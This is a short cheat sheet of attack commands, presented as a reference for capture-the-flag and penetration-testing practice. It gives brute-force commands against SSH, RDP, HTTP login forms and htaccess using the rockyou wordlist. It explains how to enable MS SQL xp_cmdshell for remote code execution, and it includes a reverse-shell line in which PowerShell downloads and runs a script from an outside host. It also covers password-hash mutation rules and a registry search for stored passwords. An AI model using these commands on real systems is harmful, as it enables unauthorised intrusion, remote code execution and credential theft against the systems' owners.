# Command reference for CTFs and pen testing practice



## Network Brute Force Commands

### htacess
`medusa -h <ip> -u user -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/blocked_dir`

### RDP
`crowbar -b rdp -s <ip> -u user -C /usr/share/wordlists/rockyou.txt -n 1`

### SSH
`hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<ip> -f -v`

### HTTP Post
`hydra <ip> http-form-post "/loginpage.php:user=admin&pass=^PASS^:<login failure message>" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`


## MS SQL RCE and Rev shell

`sqsh -U sa -S <ip>:<port>`

### test xp cmdshell
`xp_cmdshell 'whoami'`  
`go`  

### if necessary, enable xp_cmdshell
`EXEC SP_CONFIGURE 'show advanced options',1`  
`reconfigure`  
`go`  


`EXEC SP_CONFIGURE 'xp_cmdshell',1`  
`reconfigure`  
`go`  

### Rev shell options 
#### Will be tough if AV is running, try surveying system from here to find a better access method

`xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring('http://1.1.1.2/rev.ps1')"`  
`go`  

can also try certutil or powershell wget (if newish PSVersion)



## John Wordlist Mutation

### Will use Wordlist mode rules from /etc/john/john.conf
`john --rules --wordlist=wordlist.txt hashes.txt`  
`john --rules --stdout --wordlist=wordlist.txt > mutated_wordlist.txt`  


## John Wordlist Rules

`[List.Rules:Wordlist]`  
`$[0-9]`  
`$[0-9]$[0-9]`  
`cAz"[0-9]"`  
`cAz"[0-9][0-9]"`  
`cAz"[£!$]"`  
`cAz"[0-9][£!$]"`  

#### or add to a custom rules list like [List.Rules:MyRule]
`john --rules=MyRule --wordlist=wordlist.txt hashes.txt`

 a good one to use is --rules=Jumbo


## Nix Misc
### Install gobuster
sudo apt install golang -y && go get github.com/OJ/gobuster && sudo cp ~/go/bin/gobuster /usr/local/bin  

## Windows Misc

### Search through registry for "pass" in value name
`reg query HKLM /f pass /t REG_SZ /s`
